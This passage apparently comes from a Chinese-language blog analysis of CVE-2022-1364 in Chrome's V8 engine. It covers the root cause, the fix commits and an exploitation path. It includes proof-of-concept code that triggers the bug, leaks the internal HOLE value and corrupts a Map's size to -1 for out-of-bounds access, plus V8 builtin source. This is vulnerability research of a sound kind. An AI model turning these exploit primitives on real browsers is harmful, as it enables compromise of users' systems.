</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">J</span>() {}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">optim</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;if(typeof a===\&#39;number\&#39;){if(a&gt;2){for(var i=0;i&lt;100;i++);return;}b.d(a,b,1);return}&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;g++;&#39;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">70</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;&#34;use strict&#34;;b.a.call(arguments,b);return arguments[a];&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;a.b(0,a)&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;b.c();if(a){&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;g++;&#39;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">70</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">optim</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">z</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">C</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">C</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">z</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">M</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">z</span>, <span style="color:#a6e22e">C</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>};
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  };
</span></span></code></pre></div><h2 id="修复">修复</h2>
<p>了解了漏洞的成因再来看漏洞的修复，先自己想一下可能的修复方案，我想到两个方向，一个是可以在优化条件上进行检查，禁止对 this 对象的的优化，或者在用户自定义 prepareStackTrace 的情况下在 Error().stack 调用时先进行 deopt，另一种是给 this 对象加一个缓存，让第二次的 prepareStackTrace 可以读取到之前缓存的对象。</p>
<p>根据 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html">CVE-2022-1364.html</a>，实际的修复方案分两步，先在 <a href="https://chromium.googlesource.com/v8/v8/+/8081a5ffa7ebdb0e5b35cf63aa0490ad3578b940">COMMIT1</a>把 this 对象视为逃逸，这样 this 就不会被优化了，之后又通过 <a href="https://chromium.googlesource.com/v8/v8/+/add8811019a1f2015c4214c20df8e6e8d4a864bb">COMMIT2</a>进一步优化了方案， 只把 LazyDeopt 相关的 FrameState 节点的 this 值标记为逃逸，对于只能触发 EagerDeopt 的节点， this 还是按照以前的流程进行优化。</p>
<p>这就难免让人想到，如果能找到一个场景能读到 EagerDeopt 所在栈的 this 对象，又不实际触发 Deopt 操作的话，还是能触发这个漏洞。或者是除了 this 和 function 对象以外，还有没其他栈上的对象也受到影响，可能触发漏洞。</p>
<h2 id="利用">利用</h2>
<p>虽然我完全想不到这个漏洞怎么才能利用，但是 Google 的大佬已经贴心在<a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html">分析</a>中描述了漏洞的利用策略：</p>
<ul>
<li>因为 arguments 对象中包含一个实际存储参数对象的数据，因为 <code>return arguments[a]</code> 用到了这个数组，所以这个数组并没有被优化掉，两次 getThis() 获取到的对象虽然不同，但是它们都指向了同一个数组。</li>
<li>因为两次 getThis() 返回了不同的对象，对其中一个对象进行修改，有可能并不会影响另一个对象的值。</li>
<li>从一个对象中删除掉数组中的一个元素，会导致数据从 PACKED 变成 HOLEY, 但是另一个对象并不能感知到数组的变化，从后者还是能读出刚刚被删除掉的对象位置处用来占位的 HOLE 对象。</li>
</ul>
<p>这一步很简单，只需要在 POC 尾部加上如下代码就可以得到 HOLE 对象。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">e2</span>.<span style="color:#a6e22e">M</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">hole</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e2</span>.<span style="color:#a6e22e">C</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">hole</span>);
</span></span></code></pre></div><p>有了 Hole 之后可以参照 <a href="https://crbug.com/1263462">crbug.com/1263462</a> 的利用方案实现 RCE，这一步就需要好好分析一下了。</p>
<p>原文的 POC 如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Map</span>();  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">set</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">hole</span>, <span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Due to special handling of hole values, this ends up setting the size of the map to -1  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">map</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#a6e22e">hole</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#a6e22e">hole</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Size is now -1  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//print(map.size);  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Set values in the map, which presumably ends up corrupting data in front of  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// the map storage due to the size being -1  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span>}  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Optionally trigger heap verification if the above didn&#39;t already crash  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//gc();
</span></span></span></code></pre></div><p>结合注释信息可以大概知道，是因为 Map 对象对 key 为 hole 的情况有特殊处理，所以在使用 hole 进行一些操作后，得到了一个 size 有错误的 Map 对象，再利用这个 Map 对象就可以实现越界读写。</p>
<p>Map 对象的相关代码我们可以从 src/init/bootstrapper.cc 这个文件入手查看:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>{  <span style="color:#75715e">// -- M a p
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">js_map_fun</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">InstallFunction</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">global</span>, <span style="color:#e6db74">&#34;Map&#34;</span>, <span style="color:#a6e22e">JS_MAP_TYPE</span>, <span style="color:#a6e22e">JSMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kHeaderSize</span>, <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">factory</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">the_hole_value</span>(), <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapConstructor</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">InstallWithIntrinsicDefaultProto</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">js_map_fun</span>,
</span></span><span style="display:flex;"><span>									 <span style="color:#a6e22e">Context</span><span style="color:#f92672">::</span><span style="color:#a6e22e">JS_MAP_FUN_INDEX</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SharedFunctionInfo</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">shared</span>(<span style="color:#a6e22e">js_map_fun</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">shared</span>(), <span style="color:#a6e22e">isolate_</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">shared</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">DontAdaptArguments</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">shared</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_length</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Setup %MapPrototype%.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSObject</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">prototype</span>(<span style="color:#a6e22e">JSObject</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cast</span>(<span style="color:#a6e22e">js_map_fun</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">instance_prototype</span>()),
</span></span><span style="display:flex;"><span>							   <span style="color:#a6e22e">isolate</span>());
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">InstallToStringTag</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#a6e22e">factory</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Map_string</span>());
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">map_get</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SimpleInstallFunction</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;get&#34;</span>, <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeGet</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">native_context</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_map_get</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">map_get</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">map_set</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SimpleInstallFunction</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;set&#34;</span>, <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeSet</span>, <span style="color:#ae81ff">2</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check that index of &#34;set&#34; function in JSCollection is correct.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">DCHECK_EQ</span>(<span style="color:#a6e22e">JSCollection</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kAddFunctionDescriptorIndex</span>,
</span></span><span style="display:flex;"><span>			  <span style="color:#a6e22e">prototype</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">map</span>().<span style="color:#a6e22e">LastAdded</span>().<span style="color:#a6e22e">as_int</span>());
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">native_context</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_map_set</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">map_set</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">map_has</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SimpleInstallFunction</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;has&#34;</span>, <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeHas</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">native_context</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_map_has</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">map_has</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">map_delete</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SimpleInstallFunction</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;delete&#34;</span>, <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeDelete</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">native_context</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_map_delete</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">map_delete</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">SimpleInstallFunction</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;clear&#34;</span>,
</span></span><span style="display:flex;"><span>						  <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeClear</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Handle</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">entries</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SimpleInstallFunction</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;entries&#34;</span>, <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeEntries</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">JSObject</span><span style="color:#f92672">::</span><span style="color:#a6e22e">AddProperty</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#a6e22e">factory</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">iterator_symbol</span>(),
</span></span><span style="display:flex;"><span>						  <span style="color:#a6e22e">entries</span>, <span style="color:#a6e22e">DONT_ENUM</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">SimpleInstallFunction</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;forEach&#34;</span>,
</span></span><span style="display:flex;"><span>						  <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeForEach</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">SimpleInstallFunction</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;keys&#34;</span>,
</span></span><span style="display:flex;"><span>						  <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeKeys</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">SimpleInstallGetter</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>,
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">factory</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">InternalizeUtf8String</span>(<span style="color:#e6db74">&#34;size&#34;</span>),
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeGetSize</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">SimpleInstallFunction</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">prototype</span>, <span style="color:#e6db74">&#34;values&#34;</span>,
</span></span><span style="display:flex;"><span>						  <span style="color:#a6e22e">Builtin</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapPrototypeValues</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">native_context</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_initial_map_prototype_map</span>(<span style="color:#a6e22e">prototype</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">map</span>());
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">InstallSpeciesGetter</span>(<span style="color:#a6e22e">isolate_</span>, <span style="color:#a6e22e">js_map_fun</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DCHECK</span>(<span style="color:#a6e22e">js_map_fun</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">HasFastProperties</span>());
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">native_context</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_js_map_map</span>(<span style="color:#a6e22e">js_map_fun</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">initial_map</span>());
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>代码片段先创建了一个构造函数 Map, 之后又给 Map 函数的原型添加了 get,set,has,delete 等函数。</p>
<p>根据 javascript 的原型链特性，<code>map.set</code>、<code>map.delete</code> 最后实际调用的是 <code>Map.prototype.set</code>, <code>Map.prototype.delete</code>, 这两个函数是 Builtin 函数，我们来看一下代码实现。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">TF_BUILTIN</span>(<span style="color:#a6e22e">MapPrototypeSet</span>, <span style="color:#a6e22e">CollectionsBuiltinsAssembler</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">receiver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kReceiver</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kKey</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kValue</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">context</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Context</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kContext</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ThrowIfNotInstanceType</span>(<span style="color:#a6e22e">context</span>, <span style="color:#a6e22e">receiver</span>, <span style="color:#a6e22e">JS_MAP_TYPE</span>, <span style="color:#e6db74">&#34;Map.prototype.set&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NormalizeNumberKey</span>(<span style="color:#a6e22e">key</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 取得 OrderedHashMap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">LoadObjectField</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">receiver</span>), <span style="color:#a6e22e">JSMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kTableOffset</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TVARIABLE</span>(<span style="color:#a6e22e">IntPtrT</span>, <span style="color:#a6e22e">entry_start_position_or_hash</span>, <span style="color:#a6e22e">IntPtrConstant</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Label</span> <span style="color:#a6e22e">entry_found</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">not_found</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 查找 key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">TryLookupOrderedHashTableIndex</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">key</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry_start_position_or_hash</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry_found</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">not_found</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry_found</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 找到了, 修改数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// If we found the entry, we just store the value there.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">StoreFixedArrayElement</span>(<span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">entry_start_position_or_hash</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">value</span>,
</span></span><span style="display:flex;"><span>                         <span style="color:#a6e22e">UPDATE_WRITE_BARRIER</span>,
</span></span><span style="display:flex;"><span>                         <span style="color:#a6e22e">kTaggedSize</span> <span style="color:#f92672">*</span> (<span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">HashTableStartIndex</span>() <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kValueOffset</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Return</span>(<span style="color:#a6e22e">receiver</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Label</span> <span style="color:#a6e22e">no_hash</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">add_entry</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">store_new_entry</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">not_found</span>);
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 没找到插入新数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// If we have a hash code, we can start adding the new entry.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">GotoIf</span>(<span style="color:#a6e22e">IntPtrGreaterThan</span>(<span style="color:#a6e22e">entry_start_position_or_hash</span>.<span style="color:#a6e22e">value</span>(),
</span></span><span style="display:flex;"><span>                             <span style="color:#a6e22e">IntPtrConstant</span>(<span style="color:#ae81ff">0</span>)),
